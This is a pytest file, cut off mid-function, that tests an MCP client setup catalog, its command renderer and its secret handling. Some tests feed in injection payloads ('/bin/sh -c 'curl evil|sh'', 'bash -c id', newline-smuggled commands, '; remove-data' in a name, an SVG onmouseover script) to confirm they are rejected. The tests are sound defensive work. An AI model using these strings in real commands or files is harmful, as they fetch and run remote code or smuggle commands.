from __future__ import annotations

import hashlib
import inspect
import json
import shutil
from dataclasses import replace
from pathlib import Path

import pytest
from jsonschema import Draft202012Validator

from backend.catalog.mcp_apps import (
    CatalogRepository,
    CatalogValidationError,
    CompatibilityEvaluator,
    ServerMcpCapabilities,
    SetupContext,
    SetupPlanner,
    SetupRenderer,
)
from backend.catalog.mcp_apps.models import CommandArtifact, LiteralAtom
from backend.catalog.mcp_apps.renderer import SetupRenderError
from backend.catalog.mcp_apps.schema import catalog_json_schema
from backend.cli import mcp_http_register
from backend.models.oauth import OAuthClient
from backend.services import api_token_service
from backend.services.oauth_service import _apply_verified_oauth_association


def test_packaged_catalog_is_valid_and_featured_is_bounded():
    catalog = CatalogRepository().snapshot()

    assert catalog.schema_major == 1
    assert catalog.catalog_revision == "2026-09-13.1"
    assert [app.id for app in catalog.apps] == [
        "claude-code",
        "codex",
        "gemini-cli",
        "antigravity",
    ]
    assert len([app for app in catalog.apps if app.featured_rank]) <= 4
    assert {app.id: app.featured_rank for app in catalog.apps} == {
        "claude-code": 1,
        "codex": 2,
        "gemini-cli": 3,
        "antigravity": 4,
    }
    assert {profile.id for profile in catalog.generic_profiles} == {
        "other-mcp-client"
    }
    assert {item.id: item.command_name for item in catalog.executables} == {
        "claude": "claude",
        "codex": "codex",
        "gemini": "gemini",
        "agy": "agy",
    }


def test_vendor_icon_product_mapping_hashes_and_provenance_are_pinned():
    root = Path(__file__).resolve().parents[3] / "catalog" / "mcp_apps"
    payload = json.loads((root / "catalog.v1.json").read_text(encoding="utf-8"))
    expected = {
        "claude-code": (
            "icons/claude-code.svg",
            "6d53db4be375e899c937c26cf16684a80d6e869b1928d72b37748bef2560e219",
            "Anthropic",
        ),
        "codex": (
            "icons/codex-cli.svg",
            "75c1e9fffa5e8c437bec1d67197a73992bca45d166c6ff23215185dea8fae92a",
            "OpenAI",
        ),
        "gemini-cli": (
            "icons/gemini-cli.svg",
            "d6c30349364931f944e2d0f3a92acc2d7e372356995f9be02b88ecc1305ea7f0",
            "Google",
        ),
        "antigravity": (
            "icons/antigravity.svg",
            "98eb7e852bf45b60941957bd9b7fbdf00af5be05c2351727585cdc135b466c82",
            "Google",
        ),
    }

    apps = {app["id"]: app for app in payload["apps"]}
    for app_id, (asset_path, digest, vendor) in expected.items():
        app = apps[app_id]
        icon_path = root / asset_path
        assert app["vendor"] == vendor
        assert app["icon"] == {
            "assetPath": asset_path,
            "sha256": digest,
            "mediaType": "image/svg+xml",
        }
        assert hashlib.sha256(icon_path.read_bytes()).hexdigest() == digest

    generic = payload["genericProfiles"][0]
    generic_icon_path = root / generic["icon"]["assetPath"]
    assert generic["icon"]["sha256"] == (
        "c0a2e2f99faf21ef8ae317f2d27fd071724a8ad7920939c4b9f9dad5e2c4a63c"
    )
    assert hashlib.sha256(generic_icon_path.read_bytes()).hexdigest() == generic[
        "icon"
    ]["sha256"]
    for icon_path in (root / "icons").glob("*.svg"):
        assert b"\r\n" not in icon_path.read_bytes()

    attributes = (Path(__file__).resolve().parents[4] / ".gitattributes").read_text(
        encoding="utf-8"
    )
    assert "backend/catalog/mcp_apps/icons/*.svg text eol=lf" in attributes

    provenance = (root / "ASSETS.md").read_text(encoding="utf-8")
    assert "https://www.anthropic.com/news" in provenance
    assert "https://openai.com/brand/" in provenance
    assert "original neutral compatibility artwork authored for dtxWiki" in provenance
    assert "neither asset copies a Google, Gemini, or Antigravity logo" in provenance
    assert "do not imply vendor endorsement" in provenance


def test_checked_in_json_schema_is_strict_generated_projection():
    root = Path(__file__).resolve().parents[3] / "catalog" / "mcp_apps"
    schema = json.loads((root / "catalog.schema.json").read_text(encoding="utf-8"))
    payload = json.loads((root / "catalog.v1.json").read_text(encoding="utf-8"))

    assert schema == catalog_json_schema()
    Draft202012Validator.check_schema(schema)
    Draft202012Validator(schema).validate(payload)

    unknown_slot = json.loads(json.dumps(payload))
    recipe = next(
        item
        for item in unknown_slot["recipes"]
        if item["id"] == "other-client-url-access-key-r1"
    )
    recipe["artifacts"][0]["value"]["bearerToken"] = {
        "slot": "totally-unknown"
    }
    assert list(Draft202012Validator(schema).iter_errors(unknown_slot))

    env_indirection = json.loads(json.dumps(payload))
    recipe = next(
        item
        for item in env_indirection["recipes"]
        if item["id"] == "other-client-url-access-key-r1"
    )
    recipe["artifacts"][0]["value"]["bearerToken"] = {
        "slot": "access-token-env"
    }
    assert list(Draft202012Validator(schema).iter_errors(env_indirection))

    nested_bearer = json.loads(json.dumps(payload))
    recipe = next(
        item
        for item in nested_bearer["recipes"]
        if item["id"] == "other-client-url-access-key-r1"
    )
    recipe["artifacts"][0]["value"]["nested"] = {
        "bearerToken": "not-even-a-secret"
    }
    assert list(Draft202012Validator(schema).iter_errors(nested_bearer))

    unsafe_env = json.loads(json.dumps(payload))
    recipe = next(
        item
        for item in unsafe_env["recipes"]
        if item["id"] == "codex-cli-oauth-r1"
    )
    recipe["artifacts"][0]["env"] = {
        "unsafe-name": [{"literal": "non-secret"}]
    }
    assert list(Draft202012Validator(schema).iter_errors(unsafe_env))


def test_compatibility_exposes_stable_reason_instead_of_guessing_by_app_id():
    repository = CatalogRepository()
    app = repository.find_app("claude-code")
    assert app is not None
    options = CompatibilityEvaluator().evaluate(
        app.variants,
        ServerMcpCapabilities(
            oauth_available=False,
            transports=frozenset({"streamable-http"}),
            endpoint_reachability=frozenset({"public-https"}),
        ),
        SetupContext(endpoint_reachability="public-https"),
    )

    oauth = next(option for option in options if option.auth == "oauth")
    access_key = next(option for option in options if option.auth == "access-key")
    assert oauth.available is False
    assert oauth.reason_codes == ("server_oauth_unavailable",)
    assert access_key.available is True
    assert access_key.reason_codes == ()


@pytest.mark.parametrize(
    ("app_id", "variant_id", "token", "expected"),
    [
        (
            "claude-code",
            "claude-code-cli-oauth",
            None,
            "claude mcp add --scope user --transport http dtxwiki "
            "https://wiki.example/mcp",
        ),
        (
            "codex",
            "codex-cli-access-key",
            "dtx_pat_example",
            "codex mcp add dtxwiki --url https://wiki.example/mcp "
            "--bearer-token-env-var DTXWIKI_MCP_PAT",
        ),
    ],
)
def test_planner_and_renderer_preserve_existing_cli_commands(
    app_id,
    variant_id,
    token,
    expected,
):
    repository = CatalogRepository()
    plan = SetupPlanner(repository).plan_for_app(
        app_id=app_id,
        variant_id=variant_id,
        context=SetupContext(
            endpoint_reachability="public-https",
            platform="linux",
            shell="bash",
        ),
    )
    artifacts = SetupRenderer(repository).render(
        plan,
        mcp_url="https://wiki.example/mcp",
        shell="bash",
        access_token=token,
    )

    assert artifacts[0].command == expected
    if app_id == "codex":
        assert artifacts[0].env == {"DTXWIKI_MCP_PAT": token}


@pytest.mark.parametrize("url", ["http://192.168.1.10:21080/mcp", "http://[fd00::1]:21080/wiki/mcp"])
def test_renderer_supports_private_http_only_for_access_keys(url):
    repository = CatalogRepository()
    planner = SetupPlanner(repository)
    access_key = planner.plan_for_app(
        app_id="codex", variant_id="codex-cli-access-key",
        context=SetupContext(endpoint_reachability="private-network"),
    )
    rendered = SetupRenderer(repository).render(
        access_key, mcp_url=url, shell="bash", access_token="dummy-key"
    )
    assert url in rendered[0].argv
    oauth = planner.plan_for_app(
        app_id="claude-code", variant_id="claude-code-cli-oauth",
        context=SetupContext(endpoint_reachability="public-https"),
    )
    with pytest.raises(SetupRenderError, match="https://"):
        SetupRenderer(repository).render(oauth, mcp_url=url, shell="bash")


def test_official_oauth_cli_sequence_is_preserved_as_direct_argv():
    repository = CatalogRepository()
    context = SetupContext(endpoint_reachability="public-https")

    claude = SetupPlanner(repository).plan_for_app(
        app_id="claude-code",
        variant_id="claude-code-cli-oauth",
        context=context,
    )
    claude_rendered = SetupRenderer(repository).render(
        claude,
        mcp_url="https://wiki.example/mcp",
        shell="bash",
        server_name="team-wiki",
    )
    assert [
        artifact.argv
        for artifact in claude_rendered
        if artifact.kind == "command"
    ] == [
        (
            "claude",
            "mcp",
            "add",
            "--scope",
            "user",
            "--transport",
            "http",
            "team-wiki",
            "https://wiki.example/mcp",
        ),
        ("claude", "mcp", "login", "team-wiki"),
    ]

    codex = SetupPlanner(repository).plan_for_app(
        app_id="codex",
        variant_id="codex-cli-oauth",
        context=context,
    )
    codex_rendered = SetupRenderer(repository).render(
        codex,
        mcp_url="https://wiki.example/mcp",
        shell="bash",
        server_name="team-wiki",
    )
    assert [artifact.argv for artifact in codex_rendered] == [
        (
            "codex",
            "mcp",
            "add",
            "team-wiki",
            "--url",
            "https://wiki.example/mcp",
        ),
        ("codex", "mcp", "login", "team-wiki"),
    ]

    antigravity = SetupPlanner(repository).plan_for_app(
        app_id="antigravity",
        variant_id="antigravity-cli-oauth",
        context=context,
    )
    antigravity_rendered = SetupRenderer(repository).render(
        antigravity,
        mcp_url="https://wiki.example/mcp",
        shell="bash",
        server_name="team-wiki",
    )
    assert [
        artifact.argv
        for artifact in antigravity_rendered
        if artifact.kind == "command"
    ] == [
        (
            "agy",
            "mcp",
            "add",
            "--type",
            "http",
            "team-wiki",
            "https://wiki.example/mcp",
        )
    ]
    assert [
        artifact.value
        for artifact in antigravity_rendered
        if artifact.kind == "app-command"
    ] == ["/mcp"]


def test_every_oauth_cli_recipe_ships_an_authenticate_step():
    """Registration alone leaves the client unauthenticated.

    The setup surface hid sign-in behind one verification sentence, so the
    catalog now has to state the step. Each reviewed client gets the sign-in
    act its own vendor documents: a shell command where one exists, the app
    prompt where it does not.
    """

    repository = CatalogRepository()
    context = SetupContext(endpoint_reachability="public-https")
    expected = {
        "claude-code-cli-oauth": ("claude mcp login team-wiki", "command"),
        "codex-cli-oauth": ("codex mcp login team-wiki", "command"),
        "gemini-cli-oauth": ("/mcp auth team-wiki", "app-command"),
        "antigravity-cli-oauth": ("/mcp", "app-command"),
    }
    app_for_variant = {
        "claude-code-cli-oauth": "claude-code",
        "codex-cli-oauth": "codex",
        "gemini-cli-oauth": "gemini-cli",
        "antigravity-cli-oauth": "antigravity",
    }

    for variant_id, (expected_text, expected_kind) in expected.items():
        app_id = app_for_variant[variant_id]
        plan = SetupPlanner(repository).plan_for_app(
            app_id=app_id,
            variant_id=variant_id,
            context=context,
        )
        rendered = SetupRenderer(repository).render(
            plan,
            mcp_url="https://wiki.example/mcp",
            shell="bash",
            server_name="team-wiki",
        )
        sign_in = [
            artifact for artifact in rendered if artifact.step == "authenticate"
        ]
        assert sign_in, app_id
        assert [artifact.kind for artifact in rendered if artifact.step == "register"]
        commands = [
            artifact.command or artifact.value
            for artifact in sign_in
            if artifact.kind == expected_kind
        ]
        assert expected_text in commands, (app_id, commands)


def test_catalog_rejects_oauth_recipe_without_authenticate_step(tmp_path):
    target, payload = _copied_catalog(tmp_path)
    recipe = next(
        item for item in payload["recipes"] if item["id"] == "gemini-cli-oauth-r1"
    )
    recipe["artifacts"] = [
        artifact
        for artifact in recipe["artifacts"]
        if artifact.get("step") != "authenticate"
    ]
    (target / "catalog.v1.json").write_text(json.dumps(payload), encoding="utf-8")

    with pytest.raises(CatalogValidationError, match="authenticate"):
        CatalogRepository(target).snapshot()


def test_catalog_rejects_access_key_recipe_with_authenticate_step(tmp_path):
    target, payload = _copied_catalog(tmp_path)
    recipe = next(
        item
        for item in payload["recipes"]
        if item["id"] == "gemini-cli-access-key-r1"
    )
    recipe["artifacts"].append(
        {
            "kind": "app-command",
            "step": "authenticate",
            "value": [{"literal": "/mcp auth"}],
        }
    )
    (target / "catalog.v1.json").write_text(json.dumps(payload), encoding="utf-8")

    with pytest.raises(CatalogValidationError, match="authenticate"):
        CatalogRepository(target).snapshot()


def test_in_app_command_is_not_shell_quoted():
    repository = CatalogRepository()
    plan = SetupPlanner(repository).plan_for_app(
        app_id="gemini-cli",
        variant_id="gemini-cli-oauth",
        context=SetupContext(endpoint_reachability="public-https"),
    )

    rendered = SetupRenderer(repository).render(
        plan,
        mcp_url="https://wiki.example/mcp",
        # PowerShell quoting would turn the prompt text into something the
        # user cannot type into Gemini CLI.
        shell="powershell",
        server_name="team wiki",
    )

    in_app = next(
        artifact for artifact in rendered if artifact.kind == "app-command"
    )
    assert in_app.value == "/mcp auth team wiki"
    assert in_app.command is None


def test_renderer_rejects_mcp_url_with_embedded_control_characters():
    repository = CatalogRepository()
    plan = SetupPlanner(repository).plan_for_app(
        app_id="gemini-cli",
        variant_id="gemini-cli-oauth",
        context=SetupContext(endpoint_reachability="public-https"),
    )

    # urlsplit strips CR/LF/TAB before parsing, so without a raw check this
    # URL passes the parsed validation while the newline survives into the
    # rendered app-command via the mcp-url slot.
    with pytest.raises(SetupRenderError, match="control characters"):
        SetupRenderer(repository).render(
            plan,
            mcp_url="https://wiki.example/\n/mcp",
            shell="bash",
        )


@pytest.mark.parametrize(
    "injected",
    [
        "/mcp\ninjected-command",
        "/bin/sh -c 'curl evil|sh'",
        "/mcp auth\tdtxwiki",
    ],
)
def test_renderer_repins_the_final_in_app_command_line(injected):
    repository = CatalogRepository()
    plan = SetupPlanner(repository).plan_for_app(
        app_id="gemini-cli",
        variant_id="gemini-cli-oauth",
        context=SetupContext(endpoint_reachability="public-https"),
    )
    # The catalog gate validates atoms at snapshot time; an in-process caller
    # can still hand the renderer a tampered plan, so the single-line slash
    # pin must hold on the slot-substituted result too.
    tampered = replace(
        plan,
        artifacts=tuple(
            artifact.model_copy(
                update={"value": (LiteralAtom(literal=injected),)}
            )
            if artifact.kind == "app-command"
            else artifact
            for artifact in plan.artifacts
        ),
    )

    with pytest.raises(SetupRenderError, match="slash-command line"):
        SetupRenderer(repository).render(
            tampered,
            mcp_url="https://wiki.example/mcp",
            shell="bash",
        )


@pytest.mark.parametrize(
    "smuggled",
    [
        # The in-app kind bypasses the executable registry by design; without
        # the slash-command pin it would ship `bash -c ...` as setup text.
        "bash -c id",
        # A shape check, not a prefix check: an absolute shell path also
        # starts with "/".
        "/bin/sh -c 'curl evil|sh'",
    ],
)
def test_catalog_rejects_in_app_command_that_is_not_a_slash_command(
    tmp_path, smuggled
):
    target, payload = _copied_catalog(tmp_path)
    recipe = next(
        item for item in payload["recipes"] if item["id"] == "gemini-cli-oauth-r1"
    )
    in_app = next(
        artifact
        for artifact in recipe["artifacts"]
        if artifact["kind"] == "app-command"
    )
    in_app["value"] = [{"literal": smuggled}]
    (target / "catalog.v1.json").write_text(json.dumps(payload), encoding="utf-8")

    with pytest.raises(CatalogValidationError, match="slash command"):
        CatalogRepository(target).snapshot()


def test_catalog_rejects_in_app_command_with_control_characters(tmp_path):
    target, payload = _copied_catalog(tmp_path)
    recipe = next(
        item for item in payload["recipes"] if item["id"] == "gemini-cli-oauth-r1"
    )
    in_app = next(
        artifact
        for artifact in recipe["artifacts"]
        if artifact["kind"] == "app-command"
    )
    # Tab is not a line break, but app prompts interpret it (completion), so
    # it must not survive into copyable setup text.
    in_app["value"] = [{"literal": "/mcp auth\tdtxwiki"}]
    (target / "catalog.v1.json").write_text(json.dumps(payload), encoding="utf-8")

    with pytest.raises(CatalogValidationError, match="control characters"):
        CatalogRepository(target).snapshot()


@pytest.mark.parametrize("control_character", ["\n", "\r", "\x00"])
def test_catalog_rejects_a_multiline_in_app_command(tmp_path, control_character):
    target, payload = _copied_catalog(tmp_path)
    recipe = next(
        item for item in payload["recipes"] if item["id"] == "gemini-cli-oauth-r1"
    )
    in_app = next(
        artifact
        for artifact in recipe["artifacts"]
        if artifact["kind"] == "app-command"
    )
    in_app["value"] = [
        {"literal": f"/mcp auth{control_character}injected-second-line"}
    ]
    (target / "catalog.v1.json").write_text(json.dumps(payload), encoding="utf-8")

    with pytest.raises(CatalogValidationError, match="single line"):
        CatalogRepository(target).snapshot()


def test_gemini_access_key_uses_http_url_and_environment_indirection(tmp_path):
    repository = CatalogRepository()
    plan = SetupPlanner(repository).plan_for_app(
        app_id="gemini-cli",
        variant_id="gemini-cli-access-key",
        context=SetupContext(endpoint_reachability="public-https"),
    )

    rendered = SetupRenderer(repository).render(
        plan,
        mcp_url="https://wiki.example/mcp",
        shell="bash",
        access_token="dtx_pat_one-time",
        server_name="team-wiki",
    )

    assert [artifact.argv for artifact in rendered] == [
        (
            "gemini",
            "mcp",
            "add",
            "--scope",
            "user",
            "--transport",
            "http",
            "--header",
            "Authorization: Bearer $DTXWIKI_MCP_PAT",
            "team-wiki",
            "https://wiki.example/mcp",
        )
    ]
    assert rendered[0].env == {"DTXWIKI_MCP_PAT": "dtx_pat_one-time"}

    config_path = tmp_path / "settings.json"
    mcp_http_register._write_gemini_config(
        config_path,
        url="https://wiki.example/mcp",
        token="dtx_pat_one-time",
        name="team-wiki",
    )
    server = json.loads(config_path.read_text(encoding="utf-8"))["mcpServers"][
        "team-wiki"
    ]
    assert server == {
        "httpUrl": "https://wiki.example/mcp",
        "headers": {"Authorization": "Bearer $DTXWIKI_MCP_PAT"},
    }
    assert "dtx_pat_one-time" not in config_path.read_text(encoding="utf-8")


@pytest.mark.parametrize("shell", ["bash", "powershell"])
def test_antigravity_oauth_command_quotes_custom_server_name(shell):
    repository = CatalogRepository()
    plan = SetupPlanner(repository).plan_for_app(
        app_id="antigravity",
        variant_id="antigravity-cli-oauth",
        context=SetupContext(endpoint_reachability="public-https"),
    )

    rendered = SetupRenderer(repository).render(
        plan,
        mcp_url="https://wiki.example/mcp",
        shell=shell,
        server_name="team wiki; remove-data",
    )

    assert rendered[0].command == (
        "agy mcp add --type http 'team wiki; remove-data' "
        "https://wiki.example/mcp"
    )


def test_antigravity_access_key_renders_canonical_server_url_and_bearer_header():
    repository = CatalogRepository()
    plan = SetupPlanner(repository).plan_for_app(
        app_id="antigravity",
        variant_id="antigravity-cli-access-key",
        context=SetupContext(endpoint_reachability="public-https"),
    )

    rendered = SetupRenderer(repository).render(
        plan,
        mcp_url="https://wiki.example/mcp",
        shell="bash",
        access_token="dtx_pat_one-time",
        server_name="team-wiki",
    )

    config = next(artifact for artifact in rendered if artifact.kind == "json-config")
    assert json.loads(config.value) == {
        "serverUrl": "https://wiki.example/mcp",
        "headers": {"Authorization": "Bearer dtx_pat_one-time"},
    }


def test_renderer_fails_closed_on_secret_or_sink_mismatch():
    repository = CatalogRepository()
    planner = SetupPlanner(repository)
    oauth_plan = planner.plan_for_app(
        app_id="codex",
        variant_id="codex-cli-oauth",
        context=SetupContext(endpoint_reachability="public-https"),
    )
    access_plan = planner.plan_for_app(
        app_id="codex",
        variant_id="codex-cli-access-key",
        context=SetupContext(endpoint_reachability="public-https"),
    )

    with pytest.raises(SetupRenderError, match="must not receive"):
        SetupRenderer(repository).render(
            oauth_plan,
            mcp_url="https://wiki.example/mcp",
            shell="bash",
            access_token="unexpected",
        )
    with pytest.raises(SetupRenderError, match="required"):
        SetupRenderer(repository).render(
            access_plan,
            mcp_url="https://wiki.example/mcp",
            shell="bash",
        )


def test_renderer_fails_closed_on_unknown_recipe_version():
    repository = CatalogRepository()
    plan = SetupPlanner(repository).plan_for_app(
        app_id="codex",
        variant_id="codex-cli-oauth",
        context=SetupContext(endpoint_reachability="public-https"),
    )
    assert plan.recipe_version == 1

    with pytest.raises(SetupRenderError, match="unsupported setup recipe version: 2"):
        SetupRenderer(repository).render(
            replace(plan, recipe_version=2),
            mcp_url="https://wiki.example/mcp",
            shell="bash",
        )


def test_ordinary_synthetic_app_is_data_only_extension(tmp_path):
    source = Path(__file__).resolve().parents[3] / "catalog" / "mcp_apps"
    target = tmp_path / "catalog"
    shutil.copytree(source, target)
    catalog_path = target / "catalog.v1.json"
    payload = json.loads(catalog_path.read_text(encoding="utf-8"))
    synthetic = json.loads(json.dumps(payload["apps"][1]))
    synthetic.update(
        {
            "id": "synthetic-cli",
            "labels": {"en": "Synthetic CLI", "ko": "Synthetic CLI"},
            "aliases": ["fixture-only"],
            "featuredRank": None,
        }
    )
    synthetic["variants"][0]["id"] = "synthetic-cli-oauth"
    synthetic["variants"][0]["recipeIds"] = ["synthetic-cli-oauth-r1"]
    synthetic["variants"] = synthetic["variants"][:1]
    recipe = json.loads(
        json.dumps(
            next(
                item
                for item in payload["recipes"]
                if item["id"] == "codex-cli-oauth-r1"
            )
        )
    )
    recipe.update(
        {
            "id": "synthetic-cli-oauth-r1",
            "variantId": "synthetic-cli-oauth",
        }
    )
    payload["apps"].append(synthetic)
    payload["recipes"].append(recipe)
    payload["catalogRevision"] = "2026-08-04.2"
    catalog_path.write_text(json.dumps(payload), encoding="utf-8")

    repository = CatalogRepository(target)
    assert repository.find_app("synthetic-cli") is not None
    assert (
        mcp_http_register._local_config_adapter(
            "synthetic-cli",
            repository=repository,
        )
        is not None
    )
    plan = SetupPlanner(repository).plan_for_app(
        app_id="synthetic-cli",
        variant_id="synthetic-cli-oauth",
        context=SetupContext(endpoint_reachability="public-https"),
    )
    rendered = SetupRenderer(repository).render(
        plan,
        mcp_url="https://wiki.example/mcp",
        shell="bash",
    )
    assert rendered[0].command == (
        "codex mcp add dtxwiki --url https://wiki.example/mcp"
    )


def test_catalog_rejects_tampered_icon(tmp_path):
    source = Path(__file__).resolve().parents[3] / "catalog" / "mcp_apps"
    target = tmp_path / "catalog"
    shutil.copytree(source, target)
    icon = target / "icons" / "claude-code.svg"
    icon.write_text("<svg/>", encoding="utf-8")
    assert hashlib.sha256(icon.read_bytes()).hexdigest() != json.loads(
        (target / "catalog.v1.json").read_text(encoding="utf-8")
    )["apps"][0]["icon"]["sha256"]

    with pytest.raises(CatalogValidationError, match="hash mismatch"):
        CatalogRepository(target).snapshot()


def test_catalog_rejects_svg_active_content_even_with_matching_hash(tmp_path):
    target, payload = _copied_catalog(tmp_path)
    icon = target / "icons" / "claude-code.svg"
    icon.write_text(
        '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 10 10">'
        '<rect width="10" height="10" onmouseover="alert(1)"/></svg>',
        encoding="utf-8",
    )
    payload["apps"][0]["icon"]["sha256"] = hashlib.sha256(
        icon.read_bytes()
    ).hexdigest()
    (target / "catalog.v1.json").write_text(json.dumps(payload), encoding="utf-8")

    with pytest.raises(CatalogValidationError, match="unsafe SVG"):
        CatalogRepository(target).snapshot()


def test_catalog_rejects_access_token_in_json_url_sink(tmp_path):
    target, payload = _copied_catalog(tmp_path)
    recipe = next(
        item
        for item in payload["recipes"]
        if item["id"] == "other-client-url-access-key-r1"
    )
    recipe["artifacts"][0]["value"]["url"] = {"slot": "access-token"}
    (target / "catalog.v1.json").write_text(json.dumps(payload), encoding="utf-8")

    with pytest.raises(CatalogValidationError, match="unapproved JSON secret sink"):
        CatalogRepository(target).snapshot()


def test_catalog_rejects_access_token_env_in_json_bearer_sink(tmp_path):
    target, payload = _copied_catalog(tmp_path)
    recipe = next(
        item
        for item in payload["recipes"]
        if item["id"] == "other-client-url-access-key-r1"
    )
    recipe["artifacts"][0]["value"]["bearerToken"] = {
        "slot": "access-token-env"
    }
    (target / "catalog.v1.json").write_text(json.dumps(payload), encoding="utf-8")

    with pytest.raises(CatalogValidationError):
        CatalogRepository(target).snapshot()


@pytest.mark.parametrize(
    "value",
    [
        {
            "serverUrl": {"slot": "mcp-url"},
            "Authorization": {"slot": "authorization-bearer"},
        },
        {
            "serverUrl": {"slot": "mcp-url"},
            "headers": {
                "X-Authorization": {"slot": "authorization-bearer"},
            },
        },
        {
            "serverUrl": {"slot": "mcp-url"},
            "headers": {"Authorization": {"slot": "access-token"}},
        },
    ],
)
def test_catalog_rejects_antigravity_bearer_outside_exact_header_sink(
    tmp_path,
    value,
):
    target, payload = _copied_catalog(tmp_path)
    recipe = next(
        item
        for item in payload["recipes"]
        if item["id"] == "antigravity-cli-access-key-r1"
    )
    recipe["artifacts"][0]["value"] = value
    (target / "catalog.v1.json").write_text(json.dumps(payload), encoding="utf-8")

    with pytest.raises(CatalogValidationError):
        CatalogRepository(target).snapshot()


def test_catalog_rejects_nested_non_secret_bearer_token_key(tmp_path):
    target, payload = _copied_catalog(tmp_path)
    recipe = next(
        item
        for item in payload["recipes"]
        if item["id"] == "other-client-url-access-key-r1"
    )
    recipe["artifacts"][0]["value"]["nested"] = {
        "bearerToken": "not-even-a-secret"
    }
    (target / "catalog.v1.json").write_text(json.dumps(payload), encoding="utf-8")

    with pytest.raises(CatalogValidationError):
        CatalogRepository(target).snapshot()


def test_catalog_rejects_unsafe_non_secret_command_env_name(tmp_path):
    target, payload = _copied_catalog(tmp_path)
    recipe = next(
        item
        for item in payload["recipes"]
        if item["id"] == "codex-cli-oauth-r1"
    )
    recipe["artifacts"][0]["env"] = {
        "unsafe-name": [{"literal": "non-secret"}]
    }
    (target / "catalog.v1.json").write_text(json.dumps(payload), encoding="utf-8")

    with pytest.raises(CatalogValidationError):
        CatalogRepository(target).snapshot()


def test_catalog_rejects_non_standard_nan_json_constant(tmp_path):
    target, payload = _copied_catalog(tmp_path)
    recipe = next(
        item
        for item in payload["recipes"]
        if item["id"] == "other-client-url-access-key-r1"
    )
    recipe["artifacts"][0]["value"]["notJson"] = float("nan")
    (target / "catalog.v1.json").write_text(
        json.dumps(payload),
        encoding="utf-8",
    )

    with pytest.raises(CatalogValidationError, match="non-standard JSON constant"):
        CatalogRepository(target).snapshot()


def test_catalog_rejects_access_token_in_arbitrary_command_argument(tmp_path):
    target, payload = _copied_catalog(tmp_path)
    recipe = next(
        item
        for item in payload["recipes"]
        if item["id"] == "claude-code-cli-access-key-r1"
    )
    recipe["artifacts"][0]["argv"][5] = [{"slot": "access-token"}]
    (target / "catalog.v1.json").write_text(json.dumps(payload), encoding="utf-8")

    with pytest.raises(CatalogValidationError, match="unapproved command secret sink"):
        CatalogRepository(target).snapshot()


def test_renderer_rechecks_command_secret_sink_on_tampered_plan():
    repository = CatalogRepository()
    plan = SetupPlanner(repository).plan_for_app(
        app_id="claude-code",
        variant_id="claude-code-cli-access-key",
        context=SetupContext(endpoint_reachability="public-https"),
    )
    command = plan.artifacts[0].model_dump(by_alias=True)
    command["argv"] = list(command["argv"])
    command["argv"][5] = [{"slot": "access-token"}]
    tampered = replace(
        plan,
        artifacts=(CommandArtifact.model_validate(command),),
    )

    with pytest.raises(SetupRenderError, match="unapproved command sink"):
        SetupRenderer(repository).render(
            tampered,
            mcp_url="https://wiki.example/mcp",
            shell="bash",
            access_token="dtx_secret",
        )


def test_renderer_rechecks_json_secret_sink_on_tampered_plan():
    repository = CatalogRepository()
    plan = SetupPlanner(repository).plan_for_generic_profile(
        profile_id="other-mcp-client",
        variant_id="other-client-url-access-key",
        context=SetupContext(endpoint_reachability="public-https"),
    )
    artifact = plan.artifacts[0].model_copy(
        update={
            "value": {
                "url": {"slot": "access-token"},
                "bearerToken": {"slot": "access-token"},
            }
        }
    )
    tampered = replace(plan, artifacts=(artifact,))

    with pytest.raises(SetupRenderError, match="unapproved JSON sink"):
        SetupRenderer(repository).render(
            tampered,
            mcp_url="https://wiki.example/mcp",
            shell="bash",
            access_token="dtx_secret",
        )


@pytest.mark.parametrize(
    "value",
    [
        {
            "serverUrl": {"slot": "mcp-url"},
            "Authorization": {"slot": "authorization-bearer"},
        },
        {
            "serverUrl": {"slot": "mcp-url"},
            "headers": {
                "X-Authorization": {"slot": "authorization-bearer"},
            },
        },
        {
            "serverUrl": {"slot": "mcp-url"},
            "headers": {"Authorization": {"slot": "access-token"}},
        },
    ],
)
def test_renderer_rejects_antigravity_bearer_outside_exact_header_sink(value):
    repository = CatalogRepository()
    plan = SetupPlanner(repository).plan_for_app(
        app_id="antigravity",
        variant_id="antigravity-cli-access-key",
        context=SetupContext(endpoint_reachability="public-https"),
    )
    artifact = plan.artifacts[0].model_copy(update={"value": value})

    with pytest.raises(SetupRenderError, match="unapproved JSON sink"):
        SetupRenderer(repository).render(
            replace(plan, artifacts=(artifact, *plan.artifacts[1:])),
            mcp_url="https://wiki.example/mcp",
            shell="bash",
            access_token="dtx_secret",
        )


def test_renderer_rejects_access_token_env_in_json_bearer_sink():
    repository = CatalogRepository()
    plan = SetupPlanner(repository).plan_for_generic_profile(
        profile_id="other-mcp-client",
        variant_id="other-client-url-access-key",
        context=SetupContext(endpoint_reachability="public-https"),
    )
    artifact = plan.artifacts[0].model_copy(
        update={
            "value": {
                "url": {"slot": "mcp-url"},
                "bearerToken": {"slot": "access-token-env"},
            }
        }
    )

    with pytest.raises(SetupRenderError, match="unapproved JSON sink"):
        SetupRenderer(repository).render(
            replace(plan, artifacts=(artifact,)),
            mcp_url="https://wiki.example/mcp",
            shell="bash",
            access_token="dtx_secret",
        )


def test_renderer_rejects_nested_non_secret_bearer_token_key():
    repository = CatalogRepository()
    plan = SetupPlanner(repository).plan_for_generic_profile(
        profile_id="other-mcp-client",
        variant_id="other-client-url-access-key",
        context=SetupContext(endpoint_reachability="public-https"),
    )
    artifact = plan.artifacts[0].model_copy(
        update={
            "value": {
                "url": {"slot": "mcp-url"},
                "bearerToken": {"slot": "access-token"},
                "nested": {"bearerToken": "not-even-a-secret"},
            }
        }
    )

    with pytest.raises(SetupRenderError, match="nested bearerToken"):
        SetupRenderer(repository).render(
            replace(plan, artifacts=(artifact,)),
            mcp_url="https://wiki.example/mcp",
            shell="bash",
            access_token="dtx_secret",
        )


def test_renderer_rejects_unsafe_non_secret_command_env_name():
    repository = CatalogRepository()
    plan = SetupPlanner(repository).plan_for_app(
        app_id="codex",
        variant_id="codex-cli-oauth",
        context=SetupContext(endpoint_reachability="public-https"),
    )
    command = plan.artifacts[0].model_dump(by_alias=True)
    command["env"] = {"unsafe-name": [{"literal": "non-secret"}]}
    artifact = CommandArtifact.model_validate(command)

    with pytest.raises(SetupRenderError, match="unsafe command environment name"):
        SetupRenderer(repository).render(
            replace(plan, artifacts=(artifact, *plan.artifacts[1:])),
            mcp_url="https://wiki.example/mcp",
            shell="bash",
        )


def test_catalog_rejects_missing_platform_recipe_coverage(tmp_path):
    target, payload = _copied_catalog(tmp_path)
    variant = next(
        item
